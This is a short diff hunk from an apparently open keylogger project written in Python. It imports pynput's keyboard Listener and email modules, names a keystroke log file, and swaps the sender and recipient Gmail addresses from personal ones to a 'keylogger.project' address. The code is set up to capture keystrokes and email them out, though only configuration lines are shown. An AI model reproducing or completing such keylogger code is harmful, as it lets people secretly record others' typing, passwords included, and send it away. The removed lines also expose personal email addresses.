@@ -13,8 +13,8 @@ from email.mime.base import MIMEBase
 from email import encoders
 from pynput.keyboard import Key,Listener
 
-fromaddr = "anshulsoni3040@gmail.com"
-toaddr = "rappitbeats42@gmail.com"
+fromaddr = "keylogger.project.cscult@gmail.com"
+toaddr = "keylogger.project.cscult@gmail.com"
 keys_information = "log.txt"
 file_path = "E:\\Divs program\\Keylogger"
 extend = "\\"
